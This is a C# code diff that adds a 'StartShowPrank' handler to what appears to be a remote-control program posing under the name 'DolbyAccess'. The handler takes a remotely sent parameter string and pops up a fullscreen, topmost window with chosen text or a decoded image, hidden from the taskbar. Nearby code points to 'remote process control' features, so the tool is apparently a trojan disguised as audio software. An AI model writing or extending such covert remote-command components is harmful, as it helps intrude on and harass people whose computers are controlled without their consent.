@@ -586,6 +586,107 @@ namespace DolbyAccess
                 return "ERROR: " + ex.Message;
             }
         }
+        // ========== 远程展示(文字/图片/文字+图片) ==========
+        private static string StartShowPrank(string param)
+        {
+            try
+            {
+                string[] parts = param.Split('|');
+                string mode = parts.Length > 0 ? parts[0].Trim().ToUpper() : "TEXT";
+                string text = parts.Length > 1 ? parts[1] : "";
+                string imageBase64 = parts.Length > 2 ? parts[2] : "";
+                int duration = 5;
+                if (parts.Length > 3 && int.TryParse(parts[3], out int d)) duration = Math.Max(1, Math.Min(120, d));
+                int fontSize = 36;
+                if (parts.Length > 4 && int.TryParse(parts[4], out int fs)) fontSize = Math.Max(12, Math.Min(120, fs));
+                string textColor = parts.Length > 5 && !string.IsNullOrEmpty(parts[5]) ? parts[5] : "#FFFFFF";
+                string bgColor = parts.Length > 6 && !string.IsNullOrEmpty(parts[6]) ? parts[6] : "#000000";
+
+                Image showImage = null;
+                if ((mode == "IMAGE" || mode == "BOTH") && !string.IsNullOrEmpty(imageBase64))
+                {
+                    try
+                    {
+                        byte[] imgBytes = Convert.FromBase64String(imageBase64);
+                        using (var ms = new MemoryStream(imgBytes))
+                        {
+                            showImage = Image.FromStream(ms);
+                        }
+                    }
+                    catch { return "ERROR: 图片解码失败"; }
+                }
+
+                var t = new Thread(() =>
+                {
+                    try
+                    {
+                        using (var form = new Form())
+                        {
+                            form.FormBorderStyle = FormBorderStyle.None;
+                            form.WindowState = FormWindowState.Maximized;
+                            form.TopMost = true;
+                            form.ShowInTaskbar = false;
+                            form.StartPosition = FormStartPosition.CenterScreen;
+                            try { form.BackColor = ColorTranslator.FromHtml(bgColor); } catch { form.BackColor = Color.Black; }
+                            form.ShowIcon = false;
+                            form.KeyPreview = true;
+                            form.KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape || e.KeyCode == Keys.F4) form.Close(); };
+
+                            if (showImage != null)
+                            {
+                                var pictureBox = new PictureBox();
+                                pictureBox.Dock = DockStyle.Fill;
+                                pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
+                                pictureBox.Image = showImage;
+                                form.Controls.Add(pictureBox);
+                            }
+
+                            if (!string.IsNullOrEmpty(text) && (mode == "TEXT" || mode == "BOTH"))
+                            {
+                                var label = new Label();
+                                label.Dock = DockStyle.Bottom;
+                                label.Height = 120;
+                                label.Text = text;
+                                label.TextAlign = ContentAlignment.MiddleCenter;
+                                try { label.ForeColor = ColorTranslator.FromHtml(textColor); } catch { label.ForeColor = Color.White; }
+                                label.Font = new Font("微软雅黑", fontSize, FontStyle.Bold);
+                                label.BackColor = Color.FromArgb(128, 0, 0, 0);
+                                form.Controls.Add(label);
+                                label.BringToFront();
+                            }
+
+                            var tipLabel = new Label();
+                            tipLabel.AutoSize = true;
+                            tipLabel.Location = new Point(10, form.Height - 30);
+                            tipLabel.ForeColor = Color.FromArgb(180, 200, 200, 200);
+                            tipLabel.Font = new Font("Consolas", 9);
+                            tipLabel.BackColor = Color.Transparent;
+                            tipLabel.Text = "按 ESC 退出 | 剩余 " + duration + " 秒";
+                            form.Controls.Add(tipLabel);
+                            tipLabel.BringToFront();
+
+                            int remaining = duration;
+                            var timer = new System.Windows.Forms.Timer();
+                            timer.Interval = 1000;
+                            timer.Tick += (s, e) =>
+                            {
+                                remaining--;
+                                if (remaining <= 0) { timer.Stop(); form.Close(); }
+                                else tipLabel.Text = "按 ESC 退出 | 剩余 " + remaining + " 秒";
+                            };
+                            timer.Start();
+                            form.ShowDialog();
+                        }
+                    }
+                    catch { }
+                    finally { showImage?.Dispose(); }
+                });
+                t.IsBackground = true;
+                t.Start();
+                return "OK: 远程展示已启动(" + mode + ", " + duration + "秒)";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
         // ========== 远程进程控制 ==========
         // P/Invoke for process owner
         [DllImport("advapi32.dll", SetLastError = true)]
